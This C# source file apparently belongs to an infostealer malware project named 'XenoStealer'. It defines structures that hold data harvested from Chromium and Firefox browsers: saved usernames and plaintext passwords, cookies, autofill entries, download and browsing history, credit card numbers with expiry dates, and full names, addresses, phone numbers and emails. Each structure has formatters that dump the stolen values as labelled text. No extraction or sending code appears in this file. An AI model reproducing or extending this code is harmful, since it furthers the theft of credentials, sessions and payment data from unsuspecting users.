using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class DataExtractionStructs
    {

        public struct ChromiumAutoFill
        {
            public string name;
            public string value;

            public ChromiumAutoFill(string _name, string _value)
            {
                name = _name;
                value = _value;
            }

            public override string ToString()
            {
                string result = "NAME: " + name;
                result += Environment.NewLine;
                result += "VALUE: " + value;
                return result;
            }
        }
        public struct ChromiumCookie
        {
            public string domain;
            public string path;
            public string name;
            public string value;
            public long expiry;
            public bool isSecure;
            public bool isHttpOnly;
            public bool expired;

            public ChromiumCookie(string _domain, string _path, string _name, string _value, long _expiry, bool _isSecure, bool _isHttpOnly)
            {
                //convert the timestamp to unix
                _expiry /= 1000000;
                _expiry -= 11644473600;//1601-01-01T00:00:00Z

                domain = _domain;
                path = _path;
                name = _name;
                value = _value;
                expiry = _expiry;
                isSecure = _isSecure;
                isHttpOnly = _isHttpOnly;
                expired = DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds >= _expiry;
            }

            public override string ToString()
            {
                string result = "DOMAIN: " + domain;
                result += Environment.NewLine;
                result += "PATH: " + path;
                result += Environment.NewLine;
                result += "NAME: " + name;
                result += Environment.NewLine;
                result += "VALUE: " + value;
                result += Environment.NewLine;
                result += "EXPIRY: " + expiry.ToString();
                result += Environment.NewLine;
                result += "IS_SECURE: " + isSecure.ToString();
                result += Environment.NewLine;
                result += "IS_HTTP_ONLY: " + isHttpOnly.ToString();
                result += Environment.NewLine;
                result += "EXPIRED: " + expired.ToString();
                return result;
            }
        }
        public struct ChromiumLogin
        {
            public string hostname;
            public string username;
            public string password;


            public ChromiumLogin(string _username, string _password, string _hostname)
            {
                hostname = _hostname;
                username = _username;
                password = _password;
            }

            public override string ToString()
            {
                string value = "HOSTNAME: " + hostname;
                value += Environment.NewLine;
                value += "USERNAME: " + username;
                value += Environment.NewLine;
                value += "PASSWORD: " + password;
                return value;
            }
        }
        public struct ChromiumDownload
        {
            public string url;
            public string path;
            public ChromiumDownload(string _url, string _path)
            {
                path = _path;
                url = _url;
            }

            public override string ToString()
            {
                string result = "URL: " + url;
                result += Environment.NewLine;
                result += "DOWNLOAD PATH: " + path;
                return result;
            }
        }


        [Flags]
        public enum GeckoBrowserOptions
        {
            None = 0,
            Logins = 1 << 0, // 1
            Cookies = 1 << 1, // 2
            Autofills = 1 << 2, // 4
            Downloads = 1 << 3, // 8
            History = 1 << 4, // 16
            CreditCards = 1 << 5,// 32
            Addresses = 1 << 6,// 64
            All = Logins | Cookies | Autofills | Downloads | History | CreditCards | Addresses
        }

        public struct GeckoBrowser
        {
            public string browserName;

            public GeckoProfile[] profiles;

            public GeckoBrowser(GeckoProfile[] _profiles, string _browserName)
            {
                browserName = _browserName;
                if (_profiles == null)
                {
                    profiles = new GeckoProfile[0];
                }
                else
                {
                    profiles = _profiles;
                }
            }

        }

        public struct GeckoProfile
        {
            public string profileName;

            public GeckoLogin[] logins;
            public GeckoCookie[] cookies;
            public GeckoAutoFill[] autofills;
            public GeckoDownload[] downloads;
            public GeckoHistoryEntry[] history;
            public GeckoCreditCard[] creditCards;
            public GeckoAddressInfo[] addresses;

            public GeckoProfile(GeckoLogin[] _logins, GeckoCookie[] _cookies, GeckoAutoFill[] _autofills, GeckoDownload[] _downloads, GeckoHistoryEntry[] _history, GeckoCreditCard[] _creditCards, GeckoAddressInfo[] _addresses, string _profileName)
            {
                profileName = _profileName;
                if (_logins == null)
                {
                    logins = new GeckoLogin[0];
                }
                else
                {
                    logins = _logins;
                }

                if (_cookies == null)
                {
                    cookies = new GeckoCookie[0];
                }
                else
                {
                    cookies = _cookies;
                }

                if (_autofills == null)
                {
                    autofills = new GeckoAutoFill[0];
                }
                else
                {
                    autofills = _autofills;
                }

                if (_downloads == null)
                {
                    downloads = new GeckoDownload[0];
                }
                else
                {
                    downloads = _downloads;
                }

                if (_history == null)
                {
                    history = new GeckoHistoryEntry[0];
                }
                else
                {
                    history = _history;
                }

                if (_creditCards == null)
                {
                    creditCards = new GeckoCreditCard[0];
                }
                else 
                { 
                    creditCards = _creditCards;
                }

                if (_addresses == null)
                {
                    addresses = new GeckoAddressInfo[0];
                }
                else 
                { 
                    addresses= _addresses;
                }
            }

            public string GetLoginsString()
            {
                string result = "";
                foreach (GeckoLogin i in logins)
                {
                    result += i.ToString();
                    result += Environment.NewLine;
                    result += Environment.NewLine;
                }
                return result;
            }

            public string GetCookiesString()
            {
                string result = "";
                foreach (GeckoCookie i in cookies)
                {
                    result += i.ToString();
                    result += Environment.NewLine;
                    result += Environment.NewLine;
                }
                return result;
            }

            public string GetAutofillsString()
            {
                string result = "";
                foreach (GeckoAutoFill i in autofills)
                {
                    result += i.ToString();
                    result += Environment.NewLine;
                    result += Environment.NewLine;
                }
                return result;
            }

            public string GetDownloadsString()
            {
                string result = "";
                foreach (GeckoDownload i in downloads)
                {
                    result += i.ToString();
                    result += Environment.NewLine;
                    result += Environment.NewLine;
                }
                return result;
            }

            public string GetHistoryString()
            {
                string result = "";
                foreach (GeckoHistoryEntry i in history)
                {
                    result += i.ToString();
                    result += Environment.NewLine;
                    result += Environment.NewLine;
                }
                return result;
            }

        }

        public struct GeckoLogin
        {
            public string hostname;
            public string username;
            public string password;


            public GeckoLogin(string _username, string _password, string _hostname)
            {
                hostname = _hostname;
                username = _username;
                password = _password;
            }

            public override string ToString()
            {
                string value = "HOSTNAME: " + hostname;
                value += Environment.NewLine;
                value += "USERNAME: " + username;
                value += Environment.NewLine;
                value += "PASSWORD: " + password;
                return value;
            }

        }

        public struct GeckoCookie
        {
            public string domain;
            public string path;
            public string name;
            public string value;
            public int expiry;
            public bool isSecure;
            public bool isHttpOnly;
            public bool expired;

            public GeckoCookie(string _domain, string _path, string _name, string _value, int _expiry, bool _isSecure, bool _isHttpOnly)
            {
                domain = _domain;
                path = _path;
                name = _name;
                value = _value;
                expiry = _expiry;
                isSecure = _isSecure;
                isHttpOnly = _isHttpOnly;
                expired = DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds >= _expiry;
            }

            public override string ToString()
            {
                string result = "DOMAIN: " + domain;
                result += Environment.NewLine;
                result += "PATH: " + path;
                result += Environment.NewLine;
                result += "NAME: " + name;
                result += Environment.NewLine;
                result += "VALUE: " + value;
                result += Environment.NewLine;
                result += "EXPIRY: " + expiry.ToString();
                result += Environment.NewLine;
                result += "IS_SECURE: " + isSecure.ToString();
                result += Environment.NewLine;
                result += "IS_HTTP_ONLY: " + isHttpOnly.ToString();
                result += Environment.NewLine;
                result += "EXPIRED: " + expired.ToString();
                return result;
            }
        }

        public struct GeckoAutoFill
        {
            public string name;
            public string value;

            public GeckoAutoFill(string _name, string _value)
            {
                name = _name;
                value = _value;
            }

            public override string ToString()
            {
                string result = "NAME: " + name;
                result += Environment.NewLine;
                result += "VALUE: " + value;
                return result;
            }
        }

        public struct GeckoDownload
        {
            public string url;
            public string path;
            public GeckoDownload(string _url, string _path)
            {
                path = _path;
                url = _url;
            }

            public override string ToString()
            {
                string result = "URL: " + url;
                result += Environment.NewLine;
                result += "DOWNLOAD PATH: " + path;
                return result;
            }
        }

        public struct GeckoHistoryEntry
        {
            public string url;

            public GeckoHistoryEntry(string _url)
            {
                url = _url;
            }

            public override string ToString()
            {
                return "URL: " + url;
            }

        }

        public struct GeckoCreditCard
        {
            public string cardholderName;
            public string cardType;
            public string cardNumber;
            public int expirationMonth;
            public int expirationYear;

            public GeckoCreditCard(string _cardholderName, string _cardType, string _cardNumber, int _expirationMonth, int _expirationYear)
            {
                cardholderName = _cardholderName;
                cardType = _cardType;
                cardNumber = _cardNumber;
                expirationMonth = _expirationMonth;
                expirationYear = _expirationYear;
            }

            public override string ToString()
            {
                string result = "CARDHOLDER_NAME: " + cardholderName;
                result += Environment.NewLine;
                result += "CARD_TYPE: " + cardType;
                result += Environment.NewLine;
                result += "CARD_NUMBER: " + cardNumber;
                result += Environment.NewLine;
                result += "EXPIRATION_MONTH: " + expirationMonth.ToString();
                result += Environment.NewLine;
                result += "EXPIRATION_YEAR: " + expirationYear.ToString();

                return result;
            }


        }

        public struct GeckoAddressInfo
        {
            public string name;
            public string organization;
            public string streetAddress;
            public string addressLevel2;
            public string addressLevel1;
            public string postalCode;
            public string country;
            public string tel;
            public string email;
            public string givenName;
            public string additionalName;
            public string familyName;
            public string addressLine1;
            public string addressLine2;
            public string addressLine3;
            public string countryName;
            public string telNational;
            public string telCountryCode;
            public string telAreaCode;
            public string telLocal;
            public string telLocalPrefix;
            public string telLocalSuffix;

            public GeckoAddressInfo(
                string _name, string _organization, string _streetAddress, string _addressLevel2,
                string _addressLevel1, string _postalCode, string _country, string _tel, string _email,
                string _givenName, string _additionalName, string _familyName, string _addressLine1,
                string _addressLine2, string _addressLine3, string _countryName, string _telNational,
                string _telCountryCode, string _telAreaCode, string _telLocal, string _telLocalPrefix,
                string _telLocalSuffix)
            {
                name = _name;
                organization = _organization;
                streetAddress = _streetAddress;
                addressLevel2 = _addressLevel2;
                addressLevel1 = _addressLevel1;
                postalCode = _postalCode;
                country = _country;
                tel = _tel;
                email = _email;
                givenName = _givenName;
                additionalName = _additionalName;
                familyName = _familyName;
                addressLine1 = _addressLine1;
                addressLine2 = _addressLine2;
                addressLine3 = _addressLine3;
                countryName = _countryName;
                telNational = _telNational;
                telCountryCode = _telCountryCode;
                telAreaCode = _telAreaCode;
                telLocal = _telLocal;
                telLocalPrefix = _telLocalPrefix;
                telLocalSuffix = _telLocalSuffix;
            }

            public override string ToString()
            {
                string result = "NAME: " + name;
                result += Environment.NewLine;
                result += "ORGANIZATION: " + organization;
                result += Environment.NewLine;
                result += "STREET_ADDRESS: " + streetAddress;
                result += Environment.NewLine;
                result += "ADDRESS_LEVEL2: " + addressLevel2;
                result += Environment.NewLine;
                result += "ADDRESS_LEVEL1: " + addressLevel1;
                result += Environment.NewLine;
                result += "POSTAL_CODE: " + postalCode;
                result += Environment.NewLine;
                result += "COUNTRY: " + country;
                result += Environment.NewLine;
                result += "TEL: " + tel;
                result += Environment.NewLine;
                result += "EMAIL: " + email;
                result += Environment.NewLine;
                result += "GIVEN_NAME: " + givenName;
                result += Environment.NewLine;
                result += "ADDITIONAL_NAME: " + additionalName;
                result += Environment.NewLine;
                result += "FAMILY_NAME: " + familyName;
                result += Environment.NewLine;
                result += "ADDRESS_LINE1: " + addressLine1;
                result += Environment.NewLine;
                result += "ADDRESS_LINE2: " + addressLine2;
                result += Environment.NewLine;
                result += "ADDRESS_LINE3: " + addressLine3;
                result += Environment.NewLine;
                result += "COUNTRY_NAME: " + countryName;
                result += Environment.NewLine;
                result += "TEL_NATIONAL: " + telNational;
                result += Environment.NewLine;
                result += "TEL_COUNTRY_CODE: " + telCountryCode;
                result += Environment.NewLine;
                result += "TEL_AREA_CODE: " + telAreaCode;
                result += Environment.NewLine;
                result += "TEL_LOCAL: " + telLocal;
                result += Environment.NewLine;
                result += "TEL_LOCAL_PREFIX: " + telLocalPrefix;
                result += Environment.NewLine;
                result += "TEL_LOCAL_SUFFIX: " + telLocalSuffix;

                return result;
            }

        }
    }
}
